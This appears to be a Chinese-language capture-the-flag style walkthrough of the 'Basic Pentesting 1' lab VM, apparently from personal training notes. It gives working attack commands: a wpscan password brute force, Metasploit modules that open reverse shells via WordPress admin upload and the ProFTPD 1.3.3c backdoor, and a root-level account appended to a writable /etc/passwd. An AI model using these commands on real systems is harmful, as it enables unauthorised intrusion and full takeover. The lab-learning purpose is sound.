---
tags:
  - nmap
  - SSH
  - FTP
  - Wordpress
  - wpscan
  - CMS
  - Metasploit
  - PrivEsc
  - Linux提权
  - /etc/passwd
  - openssl
---
### Web 渗透提权
---
靶机 IP 为`192.168.1.167`，开放端口`21, 22, 80`
![[basic_pentesting_1-nmap.png]]
访问`http://192.168.1.167`，发现隐藏目录`/secret`。
这是一个 WordPress 站点，按[[DC-2]]的经验找到`/wp-admin`登录窗口。
利用 wpscan 爆破密码：
```bash
wpscan --url http://192.168.1.167/secret/ --passwords /usr/share/john/password.lst
```
![[basic_pentesting_1-wpscan.png]]
利用`admin:admin`登录，发现版本号 4.9
![[basic_pentesting_1-wordpress.png]]
查找 MSF 里是否存在对应的漏洞
```Metasploit
search wordpress admin
```
发现漏洞`exploit/unix/webapp/wp_admin_shell_upload`，配置参数
```Metasploit
set rhosts 192.168.1.167
set USERNAME admin
set PASSWORD admin
set TARGETURI /secret
set httpclienttimeout 300
options
exploit
```
![[basic_pentesting_1-msfconfig.png]]
（上传 Reverse Shell 需要一段时间）
如果无法看到`meterpreter >`提示符，尝试`Ctrl+C`退出后输入
```Metasploit
sessions -l
sessions -i 1
```
![[basic_pentesting_1-msfsession.png]]
进入后台会话
```bash
shell
python -c "import pty; pty.spawn('/bin/sh')"
```
得到交互Shell后，查看`/etc/passwd`权限
```bash
ls -l /etc/passwd
# -rw-rw-rw- 1 root root 2399 Dec  6 22:57 /etc/passwd
```
发现该文件`-rw-rw-rw- (666)`可写，于是写入用户和密码哈希值
```bash
# 另起终端
openssl passwd -1 pass
# $1$Gz2kF3ie$1K76HFO/YI/4g5TdHiHfu0
```
```bash
echo 'hacker:$1$Gz2kF3ie$1K76HFO/YI/4g5TdHiHfu0:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```
`su`切换至新建用户`hacker`，输入密码`pass`即可提权。
![[basic_pentesting_1-privesc.png]]
如果想更改用户 marlinspike 的密码，在提权至 root 后尝试
```bash
passwd marlinspike
```
修改密码后即可用该密码登录靶机GUI。

### FTP 后门提权
---
通过 nmap 的扫描结果，知靶机 FTP 端口的版本号是 `ProFTPD 1.3.3c`
```bash
searchsploit ProFTPD 1.3.3c
```
```Metasploit
search ProFTPD 1.3.3c
```
发现漏洞`exploit/unix/ftp/proftpd_133c_backdoor`
```Metasploit
set rhosts 192.168.1.167
set lhost 192.168.1.3
set payload cmd/unix/reverse
options
exploit
```
![[basic_pentesting_1-ftpexp.png]]
利用`pty.spawn`即可得到提示符`#`，也即直接通过后门提权。